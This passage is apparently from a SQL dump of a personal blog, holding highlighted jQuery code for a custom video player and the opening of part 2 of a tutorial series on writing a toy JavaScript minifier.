                <span class="n">d</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.endposter&quot;</span><span class="p">,</span> <span class="n">this</span><span class="p">);</span> <span class="o">//</span> <span class="n">This</span> <span class="k">is</span> <span class="n">NOT</span> <span class="n">added</span> <span class="n">to</span> <span class="n">the</span> <span class="n">whole</span> <span class="n">script</span> <span class="n">scope</span> <span class="n">so</span> <span class="n">have</span> <span class="n">to</span> <span class="n">rescope</span> <span class="n">it</span> <span class="n">here</span>
                <span class="n">b</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.errorposter&quot;</span><span class="p">,</span> <span class="n">this</span><span class="p">);</span> <span class="o">//</span> <span class="n">This</span> <span class="k">is</span> <span class="n">NOT</span> <span class="n">added</span> <span class="n">to</span> <span class="n">the</span> <span class="n">whole</span> <span class="n">script</span> <span class="n">scope</span> <span class="n">so</span> <span class="n">have</span> <span class="n">to</span> <span class="n">rescope</span> <span class="n">it</span> <span class="n">here</span>
                <span class="o">//</span>   <span class="n">Not</span> <span class="n">played</span> <span class="n">yet</span>              <span class="n">Finished</span> <span class="n">playing</span>              <span class="n">Cant</span> <span class="n">play</span> <span class="n">format</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">$</span><span class="n">startPoster</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">length</span> <span class="o">||</span> <span class="n">d</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">length</span> <span class="o">||</span> <span class="n">b</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">i</span><span class="o">.</span><span class="n">css</span><span class="p">({</span><span class="s1">&#39;opacity&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">});</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">i</span><span class="o">.</span><span class="n">fadeTo</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
                    <span class="n">i</span><span class="o">.</span><span class="n">clearQueue</span><span class="p">();</span>
                <span class="p">}</span>
            <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;mouseleave&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="n">i</span><span class="o">.</span><span class="n">fadeTo</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
                <span class="n">i</span><span class="o">.</span><span class="n">clearQueue</span><span class="p">();</span>
            <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="o">//</span> <span class="n">Move</span> <span class="n">posters</span> <span class="ow">and</span> <span class="n">controls</span> <span class="n">back</span> <span class="n">into</span> <span class="n">position</span> <span class="n">after</span> <span class="n">video</span> <span class="n">position</span> <span class="n">updated</span>
                <span class="k">var</span> <span class="n">zu</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">offset</span><span class="p">(),</span>
                    <span class="n">zt</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">width</span><span class="p">(),</span>
                    <span class="n">zs</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="n">floor</span><span class="p">(</span><span class="n">zu</span><span class="o">.</span><span class="n">top</span> <span class="o">+</span> <span class="n">j</span><span class="o">.</span><span class="n">height</span><span class="p">()</span> <span class="o">-</span> <span class="n">i</span><span class="o">.</span><span class="n">height</span><span class="p">()),</span>
                    <span class="n">d</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.endposter&quot;</span><span class="p">,</span> <span class="n">this</span><span class="p">),</span>
                    <span class="o">$</span><span class="n">errorPoster</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;.errorposter&quot;</span><span class="p">,</span> <span class="n">this</span><span class="p">);</span>

                <span class="o">$</span><span class="p">(</span><span class="o">$</span><span class="n">startPoster</span><span class="p">,</span> <span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">offset</span><span class="p">({</span><span class="n">top</span><span class="p">:</span> <span class="n">zu</span><span class="o">.</span><span class="n">top</span><span class="p">,</span> <span class="n">left</span><span class="p">:</span> <span class="n">zu</span><span class="o">.</span><span class="n">left</span><span class="p">});</span>

                <span class="n">d</span><span class="o">.</span><span class="n">offset</span><span class="p">({</span><span class="n">top</span><span class="p">:</span> <span class="n">zu</span><span class="o">.</span><span class="n">top</span><span class="p">,</span> <span class="n">left</span><span class="p">:</span> <span class="n">zu</span><span class="o">.</span><span class="n">left</span><span class="p">});</span>
                <span class="n">d</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;height&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">height</span><span class="p">());</span>
                <span class="n">d</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;width&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">width</span><span class="p">());</span>

                <span class="o">$</span><span class="n">errorPoster</span><span class="o">.</span><span class="n">offset</span><span class="p">({</span><span class="n">top</span><span class="p">:</span> <span class="n">zu</span><span class="o">.</span><span class="n">top</span><span class="p">,</span> <span class="n">left</span><span class="p">:</span> <span class="n">zu</span><span class="o">.</span><span class="n">left</span><span class="p">});</span>

                <span class="n">i</span><span class="o">.</span><span class="n">offset</span><span class="p">({</span><span class="n">top</span><span class="p">:</span> <span class="n">zs</span><span class="p">,</span> <span class="n">left</span><span class="p">:</span> <span class="n">zu</span><span class="o">.</span><span class="n">left</span><span class="p">});</span>
                <span class="n">i</span><span class="o">.</span><span class="n">width</span><span class="p">(</span><span class="n">zt</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span> <span class="o">//</span> <span class="mi">2</span> <span class="k">is</span> <span class="k">for</span> <span class="n">borders</span>
            <span class="p">})</span>
    <span class="p">)</span><span class="o">.</span><span class="n">parent</span><span class="p">();</span> <span class="o">//</span> <span class="n">Return</span> <span class="n">the</span> <span class="n">newly</span> <span class="n">created</span> <span class="n">wrapper</span> <span class="n">div</span> <span class="p">(</span><span class="n">brand</span> <span class="n">new</span> <span class="n">parent</span> <span class="n">of</span> <span class="n">the</span> <span class="n">video</span><span class="p">)</span>

    <span class="n">i</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;div&gt;&lt;/div&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="k">class</span><span class="p">:</span> <span class="s2">&quot;videoControls&quot;</span><span class="p">,</span>
        <span class="n">css</span><span class="p">:</span> <span class="p">{</span>
            <span class="n">opacity</span><span class="p">:</span> <span class="mi">0</span>
        <span class="p">}</span>
    <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="n">j</span><span class="p">);</span>

    <span class="o">//</span> <span class="n">Setup</span> <span class="n">play</span><span class="o">/</span><span class="n">pause</span> <span class="n">button</span>
    <span class="n">h</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;img /&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="k">class</span><span class="p">:</span> <span class="s2">&quot;playPauseButton&quot;</span><span class="p">,</span>
        <span class="n">src</span><span class="p">:</span> <span class="s2">&quot;/media/site-images/videoicons/smallplay.svg&quot;</span>
    <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">s</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
        <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>

    <span class="n">zz</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;span&gt;&lt;/span&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="k">class</span><span class="p">:</span> <span class="s2">&quot;timespan&quot;</span>
    <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>

    <span class="o">//</span> <span class="n">Setup</span> <span class="n">progress</span> <span class="n">bar</span>
    <span class="n">g</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;input /&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="n">type</span><span class="p">:</span> <span class="s2">&quot;range&quot;</span><span class="p">,</span>
        <span class="nb">min</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
        <span class="nb">max</span><span class="p">:</span> <span class="mi">1000</span><span class="p">,</span>
        <span class="n">value</span><span class="p">:</span> <span class="mi">0</span>
    <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;change&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">t</span><span class="o">.</span><span class="n">currentTime</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">duration</span> <span class="o">*</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">value</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">);</span>
        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;mousedown&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">t</span><span class="o">.</span><span class="n">pause</span><span class="p">();</span>
        <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;mouseup&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">t</span><span class="o">.</span><span class="n">play</span><span class="p">();</span>
        <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>

    <span class="n">a</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;span&gt;&lt;/span&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="k">class</span><span class="p">:</span> <span class="s2">&quot;timespan currenttimespan&quot;</span>
    <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>

    <span class="o">//</span> <span class="n">Full</span> <span class="n">screen</span>
    <span class="o">$</span><span class="p">(</span><span class="s2">&quot;&lt;img /&gt;&quot;</span><span class="p">,</span> <span class="p">{</span>
        <span class="k">class</span><span class="p">:</span> <span class="s2">&quot;fullscreenButton&quot;</span><span class="p">,</span>
        <span class="n">src</span><span class="p">:</span> <span class="s2">&quot;/media/site-images/videoicons/fullscreen.svg&quot;</span>
    <span class="p">})</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">zq</span> <span class="o">=</span> <span class="n">t</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">requestFullScreen</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">t</span><span class="o">.</span><span class="n">requestFullScreen</span><span class="p">();</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">webkitRequestFullScreen</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">t</span><span class="o">.</span><span class="n">webkitRequestFullScreen</span><span class="p">();</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">mozRequestFullScreen</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">t</span><span class="o">.</span><span class="n">mozRequestFullScreen</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">})</span><span class="o">.</span><span class="n">appendTo</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>

    <span class="o">//</span> <span class="n">Posters</span> <span class="n">to</span> <span class="n">show</span> <span class="n">before</span> <span class="n">the</span> <span class="n">user</span> <span class="n">plays</span> <span class="n">the</span> <span class="n">video</span>
    <span class="n">startPoster</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">startposter</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">startPoster</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">startPoster</span> <span class="o">=</span> <span class="s2">&quot;generic&quot;</span><span class="p">;</span>  <span class="o">//</span> <span class="n">If</span> <span class="n">none</span> <span class="n">supplied</span><span class="p">,</span> <span class="n">use</span> <span class="n">our</span> <span class="n">own</span><span class="p">,</span> <span class="n">generic</span> <span class="n">one</span>
    <span class="p">}</span>
    <span class="o">//</span> <span class="n">Get</span> <span class="n">the</span> <span class="n">poster</span> <span class="ow">and</span> <span class="n">make</span> <span class="n">it</span> <span class="n">inline</span>
    <span class="o">//</span> <span class="n">File</span> <span class="k">is</span> <span class="n">SVG</span> <span class="n">so</span> <span class="n">usual</span> <span class="n">jQuery</span> <span class="n">rules</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">apply</span>
    <span class="o">//</span> <span class="n">File</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">have</span> <span class="n">at</span> <span class="n">least</span> <span class="n">one</span> <span class="n">element</span> <span class="n">with</span> <span class="s2">&quot;playButton&quot;</span> <span class="k">as</span> <span class="k">class</span>
    <span class="o">$.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://assets.themetacity.com/video/&quot;</span> <span class="o">+</span> <span class="n">startPoster</span> <span class="o">+</span> <span class="s2">&quot;.startposter.svg&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">(</span><span class="n">zy</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">$</span><span class="n">startPoster</span> <span class="o">=</span> <span class="n">zr</span><span class="o">.</span><span class="n">importNode</span><span class="p">(</span><span class="n">zy</span><span class="o">.</span><span class="n">documentElement</span><span class="p">,</span> <span class="bp">true</span><span class="p">);</span>
        <span class="o">$</span><span class="n">startPoster</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="o">$</span><span class="n">startPoster</span><span class="p">);</span>

        <span class="o">$</span><span class="n">startPoster</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;class&quot;</span><span class="p">,</span> <span class="s2">&quot;poster&quot;</span><span class="p">);</span>
        <span class="o">$</span><span class="n">startPoster</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;height&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">height</span><span class="p">());</span>
        <span class="o">$</span><span class="n">startPoster</span><span class="o">.</span><span class="n">attr</span><span class="p">(</span><span class="s2">&quot;width&quot;</span><span class="p">,</span> <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">width</span><span class="p">());</span>

        <span class="o">$</span><span class="p">(</span><span class="s2">&quot;#playButton&quot;</span><span class="p">,</span> <span class="o">$</span><span class="n">startPoster</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">t</span><span class="o">.</span><span class="n">load</span><span class="p">();</span>   <span class="o">//</span> <span class="n">Initial</span> <span class="n">data</span> <span class="ow">and</span> <span class="n">metadata</span> <span class="nb">load</span> <span class="n">events</span> <span class="n">may</span> <span class="n">have</span> <span class="n">fired</span> <span class="n">before</span> <span class="n">they</span> <span class="n">can</span> <span class="n">be</span> <span class="n">captured</span> <span class="n">so</span> <span class="n">manually</span> <span class="n">fire</span> <span class="n">them</span>
            <span class="n">s</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
            <span class="o">$</span><span class="n">startPoster</span><span class="o">.</span><span class="n">remove</span><span class="p">();</span> <span class="o">//</span> <span class="n">done</span> <span class="n">with</span> <span class="n">poster</span> <span class="n">forever</span>
        <span class="p">});</span>
        <span class="n">j</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="o">$</span><span class="n">startPoster</span><span class="p">);</span>
        <span class="o">$</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span>
    <span class="p">});</span>

    <span class="o">//</span> <span class="n">Add</span> <span class="n">whe</span> <span class="n">whole</span> <span class="n">lot</span> <span class="n">onto</span> <span class="n">the</span> <span class="n">page</span>
    <span class="n">j</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>

    <span class="o">$</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span> <span class="o">//</span><span class="n">Get</span> <span class="n">its</span> <span class="n">position</span> <span class="n">right</span><span class="o">.</span>
<span class="p">});</span>

<span class="o">//</span> <span class="n">Handle</span> <span class="n">coming</span> <span class="n">out</span> <span class="n">of</span> <span class="n">fullscreen</span>
<span class="o">$</span><span class="p">(</span><span class="n">zr</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;webkitfullscreenchange mozfullscreenchange fullscreenchange&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">var</span> <span class="n">zp</span> <span class="o">=</span> <span class="n">zr</span><span class="o">.</span><span class="n">fullScreen</span> <span class="o">||</span> <span class="n">zr</span><span class="o">.</span><span class="n">mozFullScreen</span> <span class="o">||</span> <span class="n">zr</span><span class="o">.</span><span class="n">webkitIsFullScreen</span><span class="p">;</span>

    <span class="o">$</span><span class="p">(</span><span class="n">zq</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>  <span class="o">//</span> <span class="n">set</span> <span class="n">to</span> <span class="n">script</span> <span class="n">scope</span> <span class="k">as</span> <span class="n">fullScreenElement</span> <span class="n">appears</span> <span class="n">to</span> <span class="ow">not</span> <span class="n">work</span> <span class="p">(</span><span class="n">yet</span><span class="err">?</span><span class="p">)</span>
        <span class="k">var</span> <span class="n">t</span> <span class="o">=</span> <span class="n">this</span><span class="p">,</span> <span class="n">videoTime</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">currentTime</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">zp</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">$</span><span class="p">(</span><span class="s2">&quot;source&quot;</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="o">//</span> <span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">fullscreen</span> <span class="k">is</span> <span class="k">is</span> <span class="n">treated</span> <span class="n">a</span> <span class="n">boolean</span><span class="p">,</span> <span class="n">but</span> <span class="n">it</span> <span class="k">is</span> <span class="n">just</span> <span class="n">truthy</span> <span class="n">string</span>
                <span class="o">//</span> <span class="n">This</span> <span class="n">function</span> <span class="n">uses</span> <span class="n">a</span> <span class="n">standard</span> <span class="n">format</span> <span class="n">of</span> <span class="n">names</span> <span class="n">of</span> <span class="n">full</span> <span class="n">screen</span> <span class="n">appropriate</span> <span class="n">vids</span> <span class="k">as</span> <span class="n">shown</span> <span class="n">below</span><span class="p">:</span>
                <span class="o">//</span> <span class="n">original</span><span class="p">:</span> <span class="n">originalvid</span><span class="o">.</span><span class="n">xyz</span>            <span class="n">full</span> <span class="n">screen</span><span class="p">:</span> <span class="n">originalvid</span><span class="o">.</span><span class="n">fullscreen</span><span class="o">.</span><span class="n">xyz</span>
                <span class="o">//</span> <span class="n">N</span><span class="o">.</span><span class="n">B</span><span class="o">.</span> <span class="n">Can</span> <span class="ow">not</span> <span class="n">have</span> <span class="n">period</span> <span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="ow">in</span> <span class="n">original</span> <span class="n">file</span> <span class="n">same</span> <span class="n">except</span> <span class="k">for</span> <span class="n">filetype</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">fullscreen</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">var</span> <span class="n">zo</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">src</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
                    <span class="n">this</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="n">zo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="n">zo</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="n">zo</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.fullscreen.&quot;</span> <span class="o">+</span> <span class="n">zo</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
                <span class="p">}</span>
                <span class="n">t</span><span class="o">.</span><span class="n">load</span><span class="p">();</span>
            <span class="p">});</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  <span class="o">//</span> <span class="n">Have</span> <span class="n">left</span> <span class="n">fullscreen</span> <span class="ow">and</span> <span class="n">need</span> <span class="n">to</span> <span class="k">return</span> <span class="n">to</span> <span class="n">lower</span> <span class="n">res</span> <span class="n">video</span>
            <span class="o">$</span><span class="p">(</span><span class="s2">&quot;source&quot;</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
                <span class="o">//</span> <span class="n">Remove</span> <span class="n">the</span> <span class="n">full</span> <span class="n">screen</span> <span class="ow">and</span> <span class="n">go</span> <span class="n">back</span> <span class="n">to</span> <span class="n">the</span> <span class="n">original</span> <span class="n">file</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">dataset</span><span class="o">.</span><span class="n">fullscreen</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">var</span> <span class="n">zo</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">src</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
                    <span class="n">this</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="n">zo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="n">zo</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="n">zo</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="n">zo</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
                <span class="p">}</span> <span class="o">//</span> <span class="n">Nothing</span> <span class="n">was</span> <span class="n">changed</span> <span class="k">if</span> <span class="n">data</span><span class="o">-</span><span class="n">fullscreen</span> <span class="k">is</span> <span class="bp">false</span> <span class="n">so</span> <span class="n">no</span> <span class="n">need</span> <span class="n">to</span> <span class="n">do</span> <span class="n">anything</span>

                <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">load</span><span class="p">();</span>  <span class="o">//</span> <span class="n">The</span> <span class="n">video</span>
                <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span>  <span class="o">//</span> <span class="n">The</span> <span class="n">video</span> <span class="n">container</span> <span class="n">box</span>
            <span class="p">});</span>
        <span class="p">}</span>
        <span class="o">$</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;loadedmetadata&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="n">this</span><span class="o">.</span><span class="n">currentTime</span> <span class="o">=</span> <span class="n">videoTime</span><span class="p">;</span>  <span class="o">//</span> <span class="n">Skip</span> <span class="n">to</span> <span class="n">the</span> <span class="n">time</span> <span class="n">before</span> <span class="n">we</span> <span class="n">went</span> <span class="n">full</span> <span class="n">screen</span>
            <span class="n">s</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
        <span class="p">});</span>
    <span class="p">});</span>
<span class="p">});</span>
<span class="o">$</span><span class="p">(</span><span class="n">window</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s2">&quot;resize&quot;</span><span class="p">,</span> <span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="o">$</span><span class="p">(</span><span class="n">z</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="p">(</span><span class="n">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="o">$</span><span class="p">(</span><span class="n">this</span><span class="p">)</span><span class="o">.</span><span class="n">parent</span><span class="p">()</span><span class="o">.</span><span class="n">trigger</span><span class="p">(</span><span class="s2">&quot;reposition&quot;</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">});</span>
</pre></div>


<p>});
```</p>
<p>Much better.
<a href="/blog/lets-make-a-terrible-JS-minifier-pt2" title="Lets make a terrible JS minier: Part 2">Next time I will go through</a> the next steps in minification and compare end results.</p>
<p>[ghTMC] https://github.com/dougmiller/theMetaCity/tree/master/media/js "See ''theMetaCity'' on GitHub."
[ghSearcher.js] https://github.com/dougmiller/theMetaCity/blob/master/media/js/searcher.js "See the file ''searcher.js'' on GitHub."
[grasp] http://www.graspjs.com "Grasp homepage"</p>','2014-01-08 22:33:30','2014-01-08 22:33:30','<p>Part one of a fun little series on minifying some JavaScript</p>',2),
	 (3,'Lets make a terrible JS minifier: Part 2','lets-make-a-terrible-js-minifier-part-2','blog','<p><a href="/blog/lets-make-a-terrible-JS-minifier" title="Lets make a terrible JS minifier: Part 1">Following on from part 1</a>, I am now going to show the next step in minification and then compare results from minified and non minified files.</p>
<p>Now that we have minified variable names, lets look at removing some more of the extranious syntax we need to use as developers to help understand the program but isn''t actually necessary to make things work.</p>
<p>Let''s go back to searcher and strip things out.</p>
<div class="codehilite"><pre><span></span><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="s2">&quot;use strict&quot;</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">$noResults</span><span class="p">,</span> <span class="nx">$searchBox</span><span class="p">,</span> <span class="nx">$entries</span><span class="p">,</span> <span class="nx">searchTimeout</span><span class="p">,</span> <span class="nx">firstRun</span><span class="p">,</span> <span class="nx">loc</span><span class="p">,</span> <span class="nx">hist</span><span class="p">,</span> <span class="nx">win</span><span class="p">;</span>
    <span class="nx">$noResults</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#noresults&#39;</span><span class="p">);</span>
    <span class="nx">$searchBox</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#searchinput&#39;</span><span class="p">);</span>
    <span class="nx">$entries</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#workshopBlurbEntries&#39;</span><span class="p">);</span>
    <span class="nx">searchTimeout</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
    <span class="nx">firstRun</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="nx">loc</span> <span class="o">=</span> <span class="nx">location</span><span class="p">;</span>
    <span class="nx">hist</span> <span class="o">=</span> <span class="nx">history</span><span class="p">;</span>
    <span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">;</span>

    <span class="kd">function</span> <span class="nx">reset</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">hist</span><span class="p">.</span><span class="nx">state</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// Avoid infinite loops</span>
            <span class="nx">hist</span><span class="p">.</span><span class="nx">pushState</span><span class="p">({</span><span class="s2">&quot;tag&quot;</span><span class="o">:</span> <span class="kc">undefined</span><span class="p">},</span> <span class="s2">&quot;theMetaCity - Workshop&quot;</span><span class="p">,</span> <span class="s2">&quot;/workshop/&quot;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">$noResults</span><span class="p">.</span><span class="nx">hide</span><span class="p">();</span>
